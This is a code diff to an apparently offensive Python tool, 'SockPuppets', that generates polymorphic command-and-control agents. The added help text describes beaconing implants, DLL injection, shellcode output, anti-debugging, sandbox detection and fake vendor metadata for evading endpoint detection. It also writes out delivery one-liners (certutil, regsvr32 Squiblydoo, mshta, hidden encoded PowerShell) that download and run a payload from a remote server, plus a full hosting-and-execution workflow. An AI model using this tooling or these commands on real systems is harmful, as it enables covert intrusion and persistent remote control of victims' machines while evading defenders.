@@ -1221,35 +1221,544 @@ unsigned int {var_name}_len = {len(data)};
         return results
 
 
+def show_help_generate():
+    """Show help for agent generation"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+                        AGENT GENERATION HELP
+═══════════════════════════════════════════════════════════════════════════
+
+BASIC USAGE:
+    python agent.py --host <IP> --port <PORT> [OPTIONS]
+
+REQUIRED PARAMETERS:
+    --host <IP>         C2 server IP address or hostname
+    --port <PORT>       C2 server port number
+
+AGENT MODES:
+    --beacon            Enable beacon mode (callbacks at intervals)
+    --interval <SEC>    Beacon callback interval in seconds (default: 60)
+    --jitter <PCT>      Beacon timing jitter 0-100% (default: 0)
+                        Example: --jitter 30 = ±30% random variance
+
+OPERATING SYSTEMS:
+    --os <TYPE>         Target OS: auto, windows, linux, macos (default: auto)
+    --multi-os          Generate agents for ALL operating systems
+
+EXAMPLES:
+    # Windows beacon agent with 30% jitter
+    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 60 --jitter 30
+
+    # Linux streaming agent
+    python agent.py --host 10.0.0.50 --port 8443 --os linux
+
+    # Generate for all OS types
+    python agent.py --host 192.168.1.100 --port 443 --multi-os --beacon --interval 120
+
+For more help: python agent.py help [agents|formats|evasion|oneliners|examples]
+"""
+    print(help_text)
+
+def show_help_agents():
+    """Show help for agent types and features"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+                           AGENT TYPES HELP
+═══════════════════════════════════════════════════════════════════════════
+
+AGENT MODES:
+
+    STREAMING MODE (Default)
+    ├─ Persistent connection to C2
+    ├─ Real-time command execution
+    ├─ Heartbeat every 10 seconds
+    └─ Best for: Interactive sessions
+
+    BEACON MODE (--beacon)
+    ├─ Periodic callbacks to C2
+    ├─ Configurable sleep intervals
+    ├─ Optional jitter for randomization
+    ├─ Offline command queueing
+    └─ Best for: Stealth, long-term access
+
+OS-SPECIFIC FEATURES:
+
+    WINDOWS AGENTS:
+    ├─ Console window hiding (ctypes)
+    ├─ Error dialog suppression
+    ├─ PowerShell command execution
+    ├─ Windows API integration
+    └─ DLL injection support
+
+    LINUX AGENTS:
+    ├─ Daemonization (fork/setsid)
+    ├─ /dev/null I/O redirection
+    ├─ Shell detection ($SHELL)
+    ├─ UID/GID reporting
+    └─ Background process support
+
+    MACOS AGENTS:
+    ├─ Background process setup
+    ├─ AppleScript execution support
+    ├─ Unix daemonization
+    ├─ Shell integration
+    └─ Native macOS features
+
+POLYMORPHIC FEATURES:
+    ✓ Unique variable names per agent
+    ✓ Unique function names per agent
+    ✓ Unique encryption keys (SHA256-based)
+    ✓ Randomized code structure
+    ✓ Different binary signatures
+
+EXAMPLES:
+    # Windows agent with all features
+    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 30 --jitter 25
+
+    # Linux daemon agent
+    python agent.py --host 192.168.1.100 --port 443 --os linux --beacon --interval 300
+
+    # macOS streaming agent
+    python agent.py --host 192.168.1.100 --port 443 --os macos
+"""
+    print(help_text)
+
+def show_help_formats():
+    """Show help for output formats"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+                         OUTPUT FORMATS HELP
+═══════════════════════════════════════════════════════════════════════════
+
+COMPILATION OPTIONS:
+
+    EXECUTABLES (--compile)
+    ├─ Platform: Windows, Linux, macOS
+    ├─ Architectures: x86, x64, arm64
+    ├─ Features: UPX compression, fake version info
+    ├─ Output: Standalone .exe or binary
+    └─ Usage: python agent.py --host IP --port PORT --compile --arch x64
+
+    DLLs (--dll)
+    ├─ Platform: Windows only
+    ├─ Architectures: x86, x64
+    ├─ Features: DllMain export, thread-based execution
+    ├─ Output: .dll file with random export name
+    ├─ Usage: rundll32.exe <dll>,<export>
+    └─ Example: python agent.py --host IP --port PORT --os windows --dll
+
+    SHELLCODE (--shellcode)
+    ├─ Platform: Windows (x86/x64)
+    ├─ Formats:
+    │   ├─ raw       → Binary .bin file
+    │   ├─ c         → C array unsigned char[]
+    │   ├─ python    → Python bytearray[]
+    │   └─ powershell→ PowerShell byte array
+    ├─ Features: Compressed, position-independent stub
+    └─ Example: python agent.py --host IP --port PORT --shellcode --format c
+
+ARCHITECTURE OPTIONS:
+    --arch x86          32-bit Intel/AMD
+    --arch x64          64-bit Intel/AMD (default)
+    --arch arm64        64-bit ARM (compilation only)
+    --arch x86 x64      Multi-architecture (space separated)
+
+ADDITIONAL OPTIONS:
+    --no-upx            Disable UPX compression
+    --icon <file.ico>   Custom icon for executables
+    --output <dir>      Output directory (default: output/)
+
+EXAMPLES:
+
+    # Compile Windows x64 executable
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile
+
+    # Multi-architecture compilation
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --arch x86 x64
+
+    # DLL for injection
+    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x64
+
+    # Shellcode in C format
+    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format c
+
+    # Shellcode in PowerShell format
+    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format powershell
+
+    # All formats at once
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --dll --shellcode
+"""
+    print(help_text)
+
+def show_help_evasion():
+    """Show help for EDR evasion techniques"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+                        EDR EVASION TECHNIQUES
+═══════════════════════════════════════════════════════════════════════════
+
+POLYMORPHIC OBFUSCATION (Automatic):
+    ✓ Variable name randomization      → obj_ABC123, ctx_XYZ789
+    ✓ Function name randomization      → handler_DEF456, proc_GHI012
+    ✓ Import alias randomization       → import time as mgr_JKL345
+    ✓ Unique code structure per agent  → Different instruction ordering
+    ✓ Dead code insertion              → Benign junk functions/variables
+
+STRING OBFUSCATION (Automatic):
+    ✓ Base64 encoding                  → __import__('base64').b64decode(...)
+    ✓ Hexadecimal encoding             → bytes.fromhex('...')
+    ✓ Reverse string encoding          → 'string'[::-1]
+    ✓ XOR encoding with random key     → chr(ord(c)^KEY)
+
+ANTI-ANALYSIS (Automatic):
+    ✓ Anti-debugging checks            → sys.gettrace() detection
+    ✓ Sandbox timing detection         → VM detection via timing
+    ✓ Entropy reduction (EK47)         → Shannon entropy < 7.0
+    ✓ Comment stripping                → No OPSEC-sensitive comments
+    ✓ Docstring removal                → No documentation strings
+
+BINARY OBFUSCATION (--compile):
+    ✓ Fake version information         → Mimics Microsoft/Adobe/etc
+    ✓ Randomized executable names      → Unique filenames
+    ✓ UPX compression (optional)       → Adds entropy, signature variation
+    ✓ Debug symbol stripping           → Removes debugging info
+    ✓ Unique binary signatures         → Different hash per compilation
+
+ENCRYPTION:
+    ✓ Unique XOR keys per agent        → SHA256-based key generation
+    ✓ Randomized key length            → Varies per agent
+    ✓ No hardcoded keys                → Generated at creation time
+
+ENTROPY MANAGEMENT (EK47 Technique):
+    Target: Shannon entropy < 7.0 (normal code range: 4.5-6.5)
+    Method: Low-entropy padding with common English words
+    Result: Appears as legitimate code to entropy-based scanners
+
+OPSEC FEATURES:
+    ✓ No comments in generated code    → Clean, production-ready
+    ✓ No debug output                  → Silent execution
+    ✓ No hardcoded identifiers         → Fully randomized
+    ✓ Minimal static signatures        → Hard to signature
+
+EVASION STATUS:
+    [AUTO] Polymorphism                Enabled by default
+    [AUTO] String obfuscation          Enabled by default
+    [AUTO] Anti-debugging              Enabled by default
+    [AUTO] Sandbox detection           Enabled by default
+    [AUTO] Entropy reduction           Enabled by default
+    [AUTO] Comment stripping           Enabled by default
+    [OPT]  UPX compression             --compile (enabled unless --no-upx)
+    [OPT]  Fake metadata               --compile (Windows only)
+
+NOTE: All evasion techniques are applied automatically. No additional flags needed.
+
+EXAMPLES:
+    # Generate with all evasion (default)
+    python agent.py --host 192.168.1.100 --port 443 --os windows
+
+    # Compile with fake version info
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile
+
+    # Disable UPX if needed
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --no-upx
+"""
+    print(help_text)
+
+def show_help_oneliners():
+    """Show help for one-liner payloads"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+                        ONE-LINER PAYLOADS HELP
+═══════════════════════════════════════════════════════════════════════════
+
+USAGE:
+    python agent.py --host <IP> --port <PORT> --oneliners <PAYLOAD_URL>
+
+DESCRIPTION:
+    Generates one-liner payloads for various delivery mechanisms.
+    Output saved to: output/oneliners.txt
+
+DELIVERY MECHANISMS (15+):
+
+    POWERSHELL:
+    ├─ powershell                → Basic download & execute
+    └─ powershell_amsi_bypass    → With AMSI bypass
+
+    WINDOWS NATIVE:
+    ├─ mshta                     → JavaScript execution
+    ├─ mshta_download            → VBScript download wrapper
+    ├─ wscript                   → VBScript execution
+    ├─ rundll32                  → JavaScript via RunHTMLApplication
+    ├─ certutil                  → Download via CertUtil
+    ├─ bitsadmin                 → Background Intelligent Transfer
+    ├─ regsvr32                  → Squiblydoo technique
+    ├─ msiexec                   → MSI installer execution
+    └─ curl                      → Windows 10+ curl
+
+    LINUX/UNIX:
+    ├─ wget_linux                → Download via wget
+    ├─ curl_linux                → Download via curl
+    └─ python                    → Python one-liner
+
+    NETWORK:
+    └─ smb                       → UNC path execution
+
+EXAMPLE USAGE:
+
+    # Generate one-liners for hosted payload
+    python agent.py --host 192.168.1.100 --port 443 --os windows \\
+        --oneliners http://192.168.1.100:8000/agent.exe
+
+    # This creates output/oneliners.txt with all delivery methods
+
+EXAMPLE OUTPUT (oneliners.txt):
+
+    ## powershell
+    powershell -w hidden -enc <BASE64_ENCODED_COMMAND>
+
+    ## mshta
+    mshta.exe javascript:a=GetObject("script:http://...").Exec();close()
+
+    ## certutil
+    certutil -urlcache -split -f http://server/agent.exe %temp%\\p.exe && %temp%\\p.exe
+
+    ## regsvr32 (Squiblydoo)
+    regsvr32 /s /n /u /i:http://server/agent.exe scrobj.dll
+
+    ... and 11 more variants
+
+DELIVERY TIPS:
+    • PowerShell: Best for quick execution, consider AMSI
+    • MSHTA: Good for bypassing AppLocker
+    • Rundll32: Living-off-the-land binary
+    • CertUtil: Commonly whitelisted
+    • Regsvr32: Squiblydoo - COM scriptlet execution
+    • SMB: Direct execution from network share
+
+COMPLETE WORKFLOW:
+    1. Generate agent:
+       python agent.py --host 192.168.1.100 --port 443 --os windows --compile
+
+    2. Host payload:
+       python -m http.server 8000  # In output/ directory
+
+    3. Generate one-liners:
+       python agent.py --host 192.168.1.100 --port 443 --os windows \\
+           --oneliners http://192.168.1.100:8000/agent_ABC123_x64.exe
+
+    4. Use payload:
+       powershell -w hidden -enc <BASE64_FROM_ONELINERS_TXT>
+"""
+    print(help_text)
+
+def show_help_examples():
+    """Show comprehensive examples"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+                         COMPREHENSIVE EXAMPLES
+═══════════════════════════════════════════════════════════════════════════
+
+BASIC AGENT GENERATION:
+
+    # Simple Windows streaming agent
+    python agent.py --host 192.168.1.100 --port 443 --os windows
+
+    # Linux beacon agent (2-minute callback)
+    python agent.py --host 192.168.1.100 --port 443 --os linux --beacon --interval 120
+
+    # macOS beacon with 50% jitter
+    python agent.py --host 192.168.1.100 --port 443 --os macos --beacon --interval 60 --jitter 50
+
+MULTI-OS DEPLOYMENT:
+
+    # Generate agents for all platforms
+    python agent.py --host 192.168.1.100 --port 443 --multi-os --beacon --interval 180
+
+    # Compile for all platforms
+    python agent.py --host 192.168.1.100 --port 443 --multi-os --compile
+
+COMPILATION SCENARIOS:
+
+    # Windows x64 executable
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile
+
+    # Windows x86 + x64 executables
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --arch x86 x64
+
+    # Windows executable with custom icon
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --icon app.ico
+
+    # Disable UPX compression
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --no-upx
+
+DLL INJECTION:
+
+    # Generate x64 DLL
+    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x64
+
+    # Generate x86 DLL
+    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x86
+
+    # Both architectures
+    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x86 x64
+
+    # Execute DLL:
+    rundll32.exe <dll_name>,<export_function>
+
+SHELLCODE GENERATION:
+
+    # Raw binary shellcode
+    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode
+
+    # C array format (for C/C++ projects)
+    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format c
+
+    # Python format (for Python injectors)
+    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format python
+
+    # PowerShell format (for PS injectors)
+    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format powershell
+
+ONE-LINER GENERATION:
+
+    # Generate delivery payloads
+    python agent.py --host 192.168.1.100 --port 443 --os windows \\
+        --oneliners http://192.168.1.100:8000/agent.exe
+
+COMPLETE WORKFLOWS:
+
+    # Red Team Assessment - Full suite
+    python agent.py --host 10.0.0.50 --port 443 --os windows \\
+        --beacon --interval 300 --jitter 30 \\
+        --compile --dll --shellcode --format c \\
+        --arch x86 x64 \\
+        --oneliners http://10.0.0.50:8000/agent.exe
+
+    # Stealth Operation - Long beacon
+    python agent.py --host 192.168.1.100 --port 443 --os windows \\
+        --beacon --interval 3600 --jitter 50 \\
+        --compile --no-upx
+
+    # Quick Access - Streaming mode
+    python agent.py --host 192.168.1.100 --port 8443 --os linux
+
+    # Multi-platform deployment
+    python agent.py --host 192.168.1.100 --port 443 \\
+        --multi-os --beacon --interval 600 --jitter 25 \\
+        --compile --arch x64
+
+OUTPUT STRUCTURE:
+
+    output/
+    ├── agent_<hash>_beacon<interval>s_<os>.py    # Python source
+    ├── <random>_x64.exe                           # Executable
+    ├── <random>_x64.dll                           # DLL
+    ├── shellcode_<random>_x64.bin                 # Raw shellcode
+    ├── shellcode_<random>_x64.c                   # C array
+    ├── shellcode_<random>_x64.py                  # Python array
+    ├── shellcode_<random>_x64.ps1                 # PowerShell array
+    ├── oneliners.txt                              # One-liner payloads
+    └── agent_*.ps1/js/hta                         # Other formats
+
+TIPS:
+    • Always use unique agents per target (automatic)
+    • Use beacon mode with jitter for stealth
+    • Multi-architecture compilation for compatibility
+    • One-liners provide multiple delivery options
+    • Combine --compile --dll --shellcode for full arsenal
+"""
+    print(help_text)
+
+def show_main_help():
+    """Show main help menu"""
+    help_text = """
+═══════════════════════════════════════════════════════════════════════════
+              SockPuppets - Polymorphic Agent Generator v2.0
+                        EDR Evasion & Multi-Platform C2
+═══════════════════════════════════════════════════════════════════════════
+
+USAGE:
+    python agent.py --host <IP> --port <PORT> [OPTIONS]
+    python agent.py help [topic]
+
+HELP TOPICS:
+    help generate     → Agent generation options and modes
+    help agents       → Agent types, features, and OS-specific details
+    help formats      → Output formats (EXE, DLL, shellcode)
+    help evasion      → EDR evasion techniques and features
+    help oneliners    → One-liner payload generation
+    help examples     → Comprehensive usage examples
+
+QUICK START:
+    # Generate Windows beacon agent
+    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 60
+
+    # Generate for all OS types
+    python agent.py --host 192.168.1.100 --port 443 --multi-os
+
+    # Compile to executable with DLL
+    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --dll
+
+KEY FEATURES:
+    ✓ Polymorphic code generation      → Unique signature per agent
+    ✓ Advanced EDR evasion             → Anti-debug, sandbox detection
+    ✓ Multi-OS support                 → Windows, Linux, macOS
+    ✓ Multiple output formats          → EXE, DLL, shellcode
+    ✓ 15+ delivery mechanisms          → One-liner generation
+    ✓ Entropy reduction (EK47)         → Shannon entropy < 7.0
+    ✓ OPSEC-safe                       → No comments, clean code
+    ✓ Unique encryption per agent      → Auto-generated keys
+
+COMMON OPTIONS:
+    --host <IP>          C2 server address (required)
+    --port <PORT>        C2 server port (required)
+    --os <TYPE>          Target OS: windows, linux, macos, auto
+    --beacon             Enable beacon mode
+    --interval <SEC>     Beacon callback interval (default: 60)
+    --jitter <PCT>       Beacon timing jitter 0-100% (default: 0)
+    --compile            Compile to executable
+    --dll                Compile to DLL (Windows)
+    --shellcode          Generate shellcode
+    --oneliners <URL>    Generate one-liner payloads
+
+For detailed help on any topic:
+    python agent.py help <topic>
+
+For authorized security testing only.
+"""
+    print(help_text)
+
 if __name__ == '__main__':
     import argparse
+    import sys
+
+    # Check if help command was requested
+    if len(sys.argv) > 1 and sys.argv[1] == 'help':
+        if len(sys.argv) > 2:
+            topic = sys.argv[2].lower()
+            if topic == 'generate':
+                show_help_generate()
+            elif topic == 'agents':
+                show_help_agents()
+            elif topic == 'formats':
+                show_help_formats()
+            elif topic == 'evasion':
+                show_help_evasion()
+            elif topic == 'oneliners':
+                show_help_oneliners()
+            elif topic == 'examples':
+                show_help_examples()
+            else:
+                print(f"Unknown help topic: {topic}")
+                print("Available topics: generate, agents, formats, evasion, oneliners, examples")
+        else:
+            show_main_help()
+        sys.exit(0)
 
     parser = argparse.ArgumentParser(
-        description='Generate polymorphic agents with EDR evasion for multiple platforms',
+        description='SockPuppets - Polymorphic Agent Generator with EDR Evasion',
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog='''
-Examples:
-  # Generate beacon agent for current OS with obfuscation
-  python agent.py --host 192.168.1.100 --port 8443 --beacon --interval 60 --jitter 20
-
-  # Generate agents for all operating systems
-  python agent.py --host 192.168.1.100 --port 8443 --multi-os
-
-  # Generate and compile for Windows with custom icon
-  python agent.py --host 192.168.1.100 --port 8443 --os windows --compile --icon app.ico
-
-  # Generate for multiple architectures
-  python agent.py --host 192.168.1.100 --port 8443 --compile --arch x86 x64
-
-  # Generate DLL for Windows
-  python agent.py --host 192.168.1.100 --port 8443 --os windows --dll
-
-  # Generate shellcode (raw binary)
-  python agent.py --host 192.168.1.100 --port 8443 --os windows --shellcode
-
-  # Generate shellcode in C array format
-  python agent.py --host 192.168.1.100 --port 8443 --os windows --shellcode --format c
-        '''
+        epilog='For detailed help: python agent.py help [generate|agents|formats|evasion|oneliners|examples]'
     )
     parser.add_argument('--host', required=True, help='Server host/IP')
     parser.add_argument('--port', type=int, required=True, help='Server port')
